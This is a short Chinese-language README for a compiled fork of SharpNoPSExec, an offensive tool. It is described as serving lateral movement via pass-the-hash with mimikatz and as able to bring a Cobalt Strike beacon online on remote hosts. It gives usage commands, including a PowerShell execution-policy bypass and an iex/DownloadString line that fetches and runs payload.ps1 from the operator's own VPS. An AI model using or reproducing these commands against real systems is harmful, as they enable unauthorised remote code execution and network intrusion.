# SharpNoPSExec

- fork from https://github.com/juliourena/SharpNoPSExec

- 上面那个项目是用来横向移动PTH的，配合mimikatz，可以直接执行命令（比如powershell 上线cs），而不像一般建立IPC$，然后复制文件到目标上执行
- 原项目未编译，这里给他编译下
- 局限性：只能在.net 4.0下运行
![image](https://user-images.githubusercontent.com/51697332/141228831-bd18fb77-9fe9-4466-a8ba-7c1588199ba4.png)
```
SharpNoPSExec.exe --target=192.168.0.2 --payload="c:\windows\system32\cmd.exe /c powershell -exec bypass -nop -e ZQBjAGgAbwAgAEcAbwBkACAAQgBsAGUAcwBzACAAWQBvAHUAIQA="
SharpNoPSExec.exe --target=192.168.0.2 --payload="c:\windows\system32\cmd.exe /c powershell -nop -c iex(New-Object Net.WebClient).DownloadString('http://你的vps:80/payload.ps1')"
```
- #仅做记录用，侵删
